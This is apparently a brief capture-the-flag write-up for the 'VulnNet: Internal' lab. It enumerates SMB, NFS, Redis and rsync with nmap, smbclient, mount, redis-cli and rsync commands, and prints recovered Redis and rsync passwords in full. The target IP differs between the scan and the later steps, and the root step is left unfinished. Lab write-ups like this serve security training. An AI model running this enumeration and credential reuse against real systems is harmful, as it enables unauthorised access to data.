VulnNet: Internal

Context: Started scanning the machine and found many open ports. Focused on enumeration, SMB, NFS, Redis, and rsync services.

Initial Nmap Scan

sudo nmap -sS -T5 -sC -sV -p- 10.10.10.192

Key open ports:

  • 22 — SSH
  • 111 — RPC / NFS
  • 139 / 445 — Samba (SMB)
  • 6379 — Redis
  • 32809 — Java RMI
  • 37079 — mountd (NFS)
  • Other RPC/NFS related ports

SMB Enumeration

smbclient -L 10.10.10.192
smbclient //10.10.164.91/shares

The flag was located in \temp\services.txt.

NFS Shares

showmount -e 10.10.164.91
mkdir /tmp/nfs_share
sudo mount -t nfs 10.10.164.91:/opt /tmp/nfs_share
ls /tmp/nfs_share/conf

Inside redis configuration, found Redis password:

requirepass "B65Hx562F@ggAZ@F"

Redis Access

redis-cli -h 10.10.164.91 -a B65Hx562F@ggAZ@F
KEYS *
lrange authlist 0 10
GET "internal flag"

Decoded Base64 to get the rsync password:

Hcg3HP67@TW@Bc72v

Rsync Enumeration

rsync rsync://rsync-connect@10.10.164.91/files
rsync -av rsync://rsync-connect@10.10.164.91/files rsyncout

The user flag is now accessible in ~/rsyncout/sys-internal.

Root Access

Root flag is currently too complex to obtain independently. Will revisit in the future.
